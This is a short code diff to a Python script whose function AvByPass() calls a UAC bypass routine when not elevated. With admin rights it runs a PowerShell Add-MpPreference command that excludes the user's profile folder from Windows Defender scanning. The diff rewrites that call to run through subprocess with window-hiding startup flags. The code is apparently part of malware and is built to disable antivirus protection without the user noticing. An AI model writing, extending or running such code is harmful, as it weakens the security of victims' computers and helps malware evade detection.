@@ -3,6 +3,7 @@ import ctypes
 import time
 from ctypes.wintypes import *
 from ctypes import *
+from subprocess import run, STARTUPINFO, STARTF_USESHOWWINDOW
 import os, sys
 
 def AvByPass():
@@ -230,4 +231,6 @@ def AvByPass():
     if not is_admin:
         uacMethod()
     else:
-        os.system('powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:/Users"')
+        startupinfo = STARTUPINFO()
+        startupinfo.dwFlags |= STARTF_USESHOWWINDOW
+        run(["powershell", "-inputformat none", "-outputformat none", "-NonInteractive", '-Command Add-MpPreference -ExclusionPath "$ENV:USERPROFILE"'], shell=True, startupinfo=startupinfo)
